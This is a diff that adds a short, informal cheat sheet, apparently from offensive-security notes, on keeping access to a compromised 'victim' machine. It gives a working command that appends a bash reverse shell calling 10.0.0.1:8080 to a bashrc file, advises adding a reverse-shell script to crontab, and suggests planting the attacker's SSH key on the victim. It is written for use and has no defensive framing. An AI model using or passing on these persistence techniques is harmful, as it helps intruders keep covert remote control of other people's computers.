@@ -1,0 +1,30 @@
+Maintain access
+1. Edit RC or event manager.
+Add reverse shell command to rc file when victim start computer u got reverse shell
+
+Linux 
+• bashrc  
+• zshrc 
+
+Windows
+• Windows Event Manager
+
+
+example: 
+bash shell
+```
+echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" | tee -a bashrc
+```
+
+2. Cron tab
+
+create a script of reverse shell 
+add to script to cron tab
+
+• /etc/crontab
+• nano crontab 
+• 0 * * * * * script.sh
+
+ 
+3. add ur ssh auth to victim to get any time ssh
+
